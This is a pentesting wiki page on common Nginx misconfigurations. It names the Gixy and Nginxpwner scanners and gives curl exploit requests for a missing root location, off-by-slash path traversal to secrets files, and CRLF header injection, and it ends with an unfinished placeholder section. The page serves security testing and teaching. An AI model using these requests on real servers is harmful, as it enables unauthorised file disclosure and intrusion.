# Nginx 

## Theory 

NGINX is open source software for web serving, reverse proxying, caching, load balancing, media streaming, and more. But there is some common **Nginx misconfigurations** that, if left unchecked, leave the web site vulnerable to attack.

## Misconfigurations 

### Tools 

There are several tools available, such as [Gixy](https://github.com/yandex/gixy) and [Nginxpwner](https://github.com/stark0de/nginxpwner), which can automate the process of identifying misconfigurations in Nginx.

{% tabs %}
{% tab title="Gixy" %}
[Gixy](https://github.com/yandex/gixy) is a tool to analyze Nginx configuration. The main goal of Gixy is to prevent security misconfiguration and automate flaw detection. This is a static files analyzer.

```bash
#Static analyze
gixy /etc/nginx/nginx.conf
```
{% endtab %}
{% tab title="Nginxpwner" %}
[Nginxpwner](https://github.com/stark0de/nginxpwner) will dynamicly look for common Nginx misconfigurations and vulnerabilities.

```bash
#Target tab in Burp, select host, right click, copy all URLs in this host, copy to a file
cat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist 
#Or get the list of paths you already discovered in the application in some other way. 
#Note: the paths should not start with /

#Finally, run it
python3 nginxpwner.py https://example.com /tmp/pathlist
```
{% endtab %}
{% endtabs %}

### Missing root location

{% tabs %}
{% tab title="Enumeration" %}
The **root** directive specifies the root folder for Nginx. In the following example, the root folder is `/etc/nginx` which means that we can reach files within that folder.
```
server {
        root /etc/nginx;

        location /hello.txt {
                try_files $uri $uri/ =404;
                proxy_pass http://127.0.0.1:8080/;
        }
}
```
In the above example, the root folder is `/etc/nginx` which means that we can reach files within that folder. The configuration does not have a location for `/ (location / {...})`
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, the root directive will be globally set, meaning that requests to `/` will take you to the local path `/etc/nginx`.  
```bash
#We can get sensitive files as the nginx.conf
curl http://example.com/nginx.conf
```
{% endtab %}
{% endtabs %}


### Off-By-Slash Misconfiguration

{% tabs %}
{% tab title="Enumeration" %}
With the Off-by-slash misconfiguration, it is possible to traverse one step up the path due to a missing slash.  
Inside the Nginx configuration look the "location" statements, if someone looks like:
```
#Missing slash with alias directive
location /imgs { 
    alias /path/images/;
}

#Missing slash with proxy_pass directive
location /api {
    proxy_pass http://apiserver/v1/;
}
```
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an LFI vulnerability.
`/imgs../secrets.txt` will be transform to `/path/images/../secrets.txt`

```bash
#We can get sensitive files
curl http://example.com/imgs/../../secrets.txt

curl http://example.com/api/../../secrets.txt
```
{% endtab %}
{% endtabs %}

### Unsafe variable use

{% tabs %}
{% tab title="Enumeration" %}
Some frameworks, scripts and Nginx configurations unsafely use the variables stored by Nginx. This can lead to issues such as XSS, bypassing HttpOnly-protection, information disclosure and in some cases even RCE.

With a configuration such as the following:
```
location / {
  return 302 https://example.com$uri;
}
```
The misconfiguration related is to use `$uri` or `$document_uri` instead of `$request_uri` which results in a **CRLF injection**. This is because this two variables contain the normalized URI whereas the normalization in Nginx includes URL decoding.
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an CRLF vulnerability.    
URL-encoding the new line characters (\r\n) results in the following representation of the characters `%0d%0a`.  
When these characters are included in a request like `http://localhost/%0d%0aDetectify:%20clrf` to a server with the misconfiguration, the server will respond with a new header named Detectify since the $uri variable contains the URL-decoded new line characters.
```bash
#We send the following request
curl http://example.com/%0d%0aDetectify:%20clrf

#The server respond with a new header named Detectify
#since the $uri variable contains the URL-decoded new line characters.
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
learn more about CRLF and TTP response splitting [here](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/)

{% endtab %}
{% endtabs %}

### Raw backend response reading

{% tabs %}
{% tab title="Enumeration" %}
enum...
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example....
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/" %}
{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" %}
